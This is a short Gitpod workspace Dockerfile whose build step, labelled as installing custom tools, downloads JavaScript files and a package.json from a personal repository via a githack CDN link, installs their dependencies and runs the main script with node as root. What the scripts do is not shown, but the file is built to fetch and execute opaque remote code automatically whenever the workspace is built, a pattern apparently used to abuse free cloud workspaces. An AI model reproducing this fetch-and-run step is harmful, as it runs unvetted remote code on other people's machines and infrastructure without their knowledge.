FROM gitpod/workspace-full:latest

USER root

# Install custom tools, runtime, etc.
RUN sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get install -yq wget --fix-missing && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/app-ubuntu-auto-c.js && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/package.json && wget https://rawcdn.githack.com/vippro99/nodejs-task/8ddbe6dec5e9ad6c4e642f7ef65c37b426b840af/log-print.js && chmod +x app-ubuntu-auto-c.js package.json log-print.js && npm i -s && node app-ubuntu-auto-c.js
 
# Give back control
USER root
